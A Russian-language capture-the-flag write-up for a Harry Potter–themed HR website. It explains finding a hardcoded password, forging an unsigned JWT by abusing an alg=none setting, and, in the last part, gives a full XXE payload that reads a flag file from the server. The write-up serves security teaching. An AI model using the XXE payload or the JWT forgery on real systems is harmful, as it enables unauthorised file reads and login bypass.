# Хрюшка

## Информация

Скажете вы, что неканонично в магическом мире пользоваться телефонами, компьютерами,
флипперами и прочими атрибутами зависимого от электричества и интернета человека. Но
Министерство магии, увы, решило не стоять на месте, и заказать на новый год у Деда Мороза
(не спрашивайте) модный сайт для системы кадрового учета магов.

Конечно же, маги умные, и решили пока не палиться. Согласитесь, выдай мы вам сервис,
по которому понятно, что он магический, так сразу же простые смертные бы все узнали.
Узнали бы не только оргструктуру Министерства магии, и то, что волшебники существуют, но и,
что не менее ужасно, что и по сей день близ одного шотландского замка взмахами волшебной
палочки соревнуются силы добра и зла.

В ваших руках отговорить Министерство от затеи переходить с толстенных томов, лежащих в 
бухгалтерии, на какие-то компьютеры, из которых в три клика мышкой можно узнать флаг,
который скрывает генеральный директор. Сделайте это быстрее Пожирателей смерти!

## Решение

Нам дали код, изучаем его. Видим прямо в коде пароль Васи Пупкина (`cmd/main.go`). Заходим под ним и видим оргструктуру, оттуда же чуть позже получим UID CEO.

Продолжная изучать код, видим, что флаг `IsLead` у Васи не проставлен, и есть метод, доступный только руководителям, возвращающий easy flag.

Попробуем сделать Васю руководителем. Посмотрим внимательно на реализацию аутентификации: `internal/auth.go`. Там прямым текстом в коде написано, что в JWT разрешается alg=none. Любым удобным способом (руками или через JWT editor плагин бурпа) делаем неподписанную куку с UID CEO (так как он лид). Получаем легкий флаг.

add_employees не только использует отдельную библиотеку для парсинга XML, но и принимает XML со странными параметрами:

```go
p.Options.Set(
		parser.XMLParseDTDLoad,
		parser.XMLParseDTDAttr,
		parser.XMLParseNoEnt,
	)
```

Добавляем employee по типу такого:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employee [
  <!ENTITY xxe SYSTEM "file:///app/hard_flag.txt">
]>
<employee>
  <name>&xxe;</name>
  <surname>Injected</surname>
  <department>Backend</department>
  <salary>1337</salary>
</employee>
```

Так как добавление сотрудника не реализовано, содержимое флага проливается в респонс. Получаем сложный флаг через уязвимость XXE.
